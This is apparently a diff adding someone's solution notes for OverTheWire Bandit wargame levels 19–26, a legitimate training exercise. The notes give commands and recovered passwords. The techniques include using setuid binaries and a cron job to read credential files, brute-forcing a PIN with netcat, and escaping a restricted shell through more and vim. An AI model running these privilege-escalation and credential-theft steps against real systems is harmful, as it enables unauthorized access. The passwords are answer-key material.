@@ -1,0 +1,281 @@
+awhqfNnAbc1naukrpqDYcF95h7HoMTrC
+
+-----------------------------level19
+ssh bandit19@bandit.labs.overthewire.org -p 2220
+
+./bandit20-do
+
+OUTPUT: Run a command as another user.
+  		Example: ./bandit20-do id
+
+./bandit20-do whoami
+output: bandit20
+
+./bandit20-do id
+output: uid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11019(bandit19)
+
+ls -l ./bandit20-do 
+-rw[s]r-x---  1 bandit20 bandit19 14872 Sep  1 06:30 bandit20-do
+
+the 's' means this file can be executed by an escelated user.
+
+how to run  a setuid binary
+
+./bandit20-do cat /etc/bandit_pass/bandit20
+VxCazJaVykI6W36BkBU0mJTCM8rR95XT
+
+-----------------------------level20
+ssh bandit20@bandit.labs.overthewire.org -p 2220
+
+first just run the setuid binary to get the usage:
+
+we have to open a server (on localhost with any random port no)
+
+nc -lvp 4040
+
+-l == server is listening for tcp/udp
+-v == will have a verbose output
+-p == port no
+
+go to another window of terminal and run the binary file to connect to the server 
+
+./suconnect 4040
+
+Then put the current password on the listening port of 4040
+then setuid binary will reply the correct output.
+
+
+NvEJF7oVjkddltPSrdKEFOllh9V1IBcq
+
+-----------------------------level21
+ssh bandit21@bandit.labs.overthewire.org -p 2220
+
+cd /etc/cron.d/
+
+ls -la
+
+cat cronjob_bandit22 
+
+>> @reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+
+
+cat /usr/bin/cronjob_bandit22.sh
+
+>> #!/bin/bash
+chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+
+password for next level is dumped in tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv with permission
+
+cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+>>WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff
+
+
+-----------------------------level22
+ssh bandit22@bandit.labs.overthewire.org -p 2220
+
+cd /etc/cron.d/
+
+ls -la
+
+cat cronjob_bandit23 
+
+>> @reboot bandit23 /usr/bin/cronjob_bandit23.sh &> /dev/null
+* * * * * bandit23 /usr/bin/cronjob_bandit23.sh &> /dev/null
+
+cat /usr/bin/cronjob_bandit23.sh
+---
+>> #!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+---
+
+now run the scripts to do the task and you will
+get the bandit22 pass at /tmp/$mytarget. That is not what the question is asking.
+
+so we can instead run the command of the script
+
+echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+>>8ca319486bfbbc3663ea0fbe81326349
+
+cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+>>QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
+
+-----------------------------level23
+ssh bandit23@bandit.labs.overthewire.org -p 2220
+
+cd /etc/cron.d/
+ls -l
+
+cat cronjob_bandit24
+>> @reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+   * * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+
+
+cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname/foo
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+
+
+
+create a script in /tmp dir --> create a pass.sh --> create a file to store the pass using a command line
+copy that to the /var/spool/bandit24/foo 
+wait for around 1 minute
+
+cd /tmp/yYyYea
+touch pass.sh
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/yYyYea/pass
+
+touch pass
+
+chmod 777 -R /tmp/yYyYea
+
+cp pass.sh /var/spool/bandit24/foo
+
+ls -l
+total 4
+-rwxrwxrwx 1 bandit23 bandit23  0 Nov 22 17:41 pass
+-rwxrwxrwx 1 bandit23 bandit23 61 Nov 22 17:10 pass.sh
+
+
+ls -l
+total 8
+-rwxrwxrwx 1 bandit23 bandit23 33 Nov 22 17:43 pass
+-rwxrwxrwx 1 bandit23 bandit23 61 Nov 22 17:10 pass.sh
+
+cat pass
+
+VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
+
+
+-----------------------------level24
+ssh bandit24@bandit.labs.overthewire.org -p 2220
+
+nano script.sh
+#!/bin/bash
+for i in {0000..9999}
+do
+        echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i >> pos.txt
+done
+
+chmod 777 script.sh
+
+./script.sh
+
+cat pos.txt | nc localhost 30002 > result.txt
+
+sort result.txt | grep -v "Wrong" 
+
+p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
+
+
+-----------------------------level25
+ssh bandit25@bandit.labs.overthewire.org -p 2220
+
+You can find bandit26 user default shell location in /etc/passwd
+
+cat /etc/passwd | grep bandit26
+
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+
+bandit26's shell is at /usr/bin/showtext which is not the usual case.
+
+cat /usr/bin/showtext
+#!/bin/sh
+
+export TERM=linux
+
+exec more ~/text.txt
+exit 0
+
+
+bandit25@bandit:~$ ssh -i sshkey.private bandit26@bandit.labs.overthewire.org -p 2220
+
+This will give us an error: Could not create directory '/home/bandit25/.ssh' (Permission denied).
+
+bandit25@bandit:~$ cp ssh.private /tmp/yYyYea
+cd /tmp/yYyY
+mkdir -p .ssh
+bandit25@bandit:/tmp/yYyYea$ ssh -i sshkey.private bandit26@bandit.labs.overthewire.org -p 2220
+
+  Enjoy your stay!
+
+  _                     _ _ _   ___   __  
+ | |                   | (_) | |__ \ / /  
+ | |__   __ _ _ __   __| |_| |_   ) / /_  
+ | '_ \ / _` | '_ \ / _` | | __| / / '_ \ 
+ | |_) | (_| | | | | (_| | | |_ / /| (_) |
+ |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/ 
+Connection to bandit.labs.overthewire.org closed.
+
+
+It's because the text.txt is too small. We can use more command's advantage more is used to view the text files in the command prompt, displaying one screen at a time in case the file is LARGE.
+In other words, more command will NOT exit if there are more contents to be display.
+
+
+so resize the terminal to six lines screen and run the command again.
+
+bandit25@bandit:/tmp/yYyYea$ ssh -i sshkey.private bandit26@bandit.labs.overthewire.org -p 2220
+
+this time, more command will wait for the file to end.
+now press 'v' command to initiate vim editor
+then write ':e /etc/bandit_pass/bandit26' and hit enter
+
+c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1
+
+
+-----------------------------level26
+ssh bandit26@bandit.labs.overthewire.org -p 2220
+
+again, downscale the terminal and connect to bandit26 with pass and try to fix the shell to /bin/sh
+
+at more command, type 'v' to get the vim editor
+
+to check the current shell:
+:set shell ?
+>> shell=/usr/bin/showtext
+
+change the shell:
+:set shell=/bin/sh
+
+To execute a command in subshell, enter :!command. Lets execute in the subshell the following command
+
+:!ls -la
+
+-rwsr-x---  1 bandit27 bandit26 14872 Sep  1 06:30 bandit27-do
+we shall see a privileged file named bandit27-do
+
+:! ./bandit27-do cat /etc/bandit_pass/bandit27
+
+YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS 
+
+
+
+
+
+
+
+
